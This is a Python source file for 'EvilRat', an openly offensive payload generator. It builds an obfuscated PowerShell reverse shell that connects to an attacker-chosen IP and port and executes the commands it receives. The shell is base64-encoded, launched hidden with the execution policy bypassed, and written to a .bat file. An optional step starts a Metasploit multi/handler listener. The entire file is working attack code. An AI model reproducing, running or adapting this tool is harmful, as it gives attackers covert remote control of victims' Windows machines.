import argparse
import os
from base64 import urlsafe_b64encode
from pathlib import Path


def main():
    parser = argparse.ArgumentParser(description="Python Implementation of EvilRat")
    parser.add_argument("lhost", help="ip address of attacker machine")
    parser.add_argument("lport", help="port of attacker machine")
    parser.add_argument("-o", "--output", help="output filename", default="rat")
    parser.add_argument("--handler", action='store_true', help="flag to start handler after generating payload")
    parser.add_argument("--no-noexit", action='store_true', help="disable noexit option on payload")
    parser.add_argument("--no-syswow64", action='store_true', help="disable usage of syswow64 powershell in payload")
    args = parser.parse_args()
    outputPath = Path(f"{args.output}.bat")
    createFinalPayload(outputPath, args.lhost, args.lport, no_syswow64=args.no_syswow64, no_noexit=args.no_noexit)
    if args.handler:
        startHandler(args.lhost, args.lport)

def createFinalPayload(outputPath, lhost, lport, no_syswow64=False, no_noexit=False):
    print(f"[+] generating payload for {lhost}:{lport}")
    payload = generatePayload(lhost, lport)
    print(f"[+] encoding payload using psbase")
    finalPayload = encodePayload(payload, no_syswow64=no_syswow64, no_noexit=no_noexit)
    print(finalPayload)
    print(f"[+] writing payload to {outputPath}")
    with outputPath.open("w+") as f:
        f.write(finalPayload)

def generatePayload(lhost, lport):
    VarL=f"$hmGuXO='{lhost}'"
    VarP=f"$jXFgb='{lport}'"
    VarM='$OeGmpK='
    VarM1='New-Object '
    VarM11='System.Net.Sock'
    VarM111='ets.TCPClient('
    VarN='$hmGuXO,$jXFgb);$VXMOY=$OeGmpK.GetStream();[byte[]]$uRhWU=0..65535|%{0};$nxFUFH=([text.encoding]::ASCII).GetBytes('
    VarO="'PS '+(Get-Location).Path+'> ');"
    VarR='$VXMOY.Write($nxFUFH,0,$nxFUFH.Length);while(($riojM=$VXMOY.Read($uRhWU,0,$uRhWU.Length)) -ne 0){$SaY=([text.encoding]::ASCII).GetString($uRhWU,0,$riojM);try{$nuuojT=(Invoke-Expression -c $SaY 2>&1|Out-String)}catch{Write-Warning '
    VarS="'Something went wrong with execution of command on the target.'"
    VarT=';Write-Error $_;};$hmGuXO0=$nuuojT+'
    VarU="'PS '+(Get-Location).Path+'> ';"
    VarZ='$hmGuXO1=($hmGuXO2[0]|Out-String);$hmGuXO2.clear();$hmGuXO0=$hmGuXO0+$hmGuXO1;$nxFUFH=([text.encoding]::ASCII).GetBytes($hmGuXO0);$VXMOY.Write($nxFUFH,0,$nxFUFH.Length);$VXMOY.Flush();};$OeGmpK.Close();if($hmGuXO3){$hmGuXO3.Stop();};'

    varF=f"{VarL};{VarP};{VarM}{VarM1}{VarM11}{VarM111}{VarN}{VarO}{VarR}{VarS}{VarT}{VarU}{VarZ}\n"
    return varF

def encodePayload(payload, no_syswow64=False, no_noexit=False):
    b64 = urlsafe_b64encode(payload.encode("utf-16le"))
    # import to replace '-' otherwise revshell wont work, seems to be a problem with different base64 RFC used
    # python uses RFC 3548 and Windows Powershell may use RFC 2045
    b64 = b64.decode("utf-8").replace('-', '+')
    cmd = "powershell.exe "

    if not no_syswow64:
        cmd = r"c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe "

    if not no_noexit:
        cmd += "-W Hidden -nop -ep bypass -NoExit "

    cmd += f"-E {b64}"
    return cmd

def startHandler(lhost, lport):
    evilratRC = Path("evilrat.rc")
    with evilratRC.open("w+") as f:
        f.write("use multi/handler\n")
        f.write("set payload windows/shell_reverse_tcp\n")
        f.write(f"set LHOST {lhost}\n")
        f.write(f"set LPORT {lport}\n")
        f.write(f"exploit\n")
    os.system(f"sudo msfconsole -r {evilratRC}")
    evilratRC.unlink()

if __name__ == '__main__':
    main()
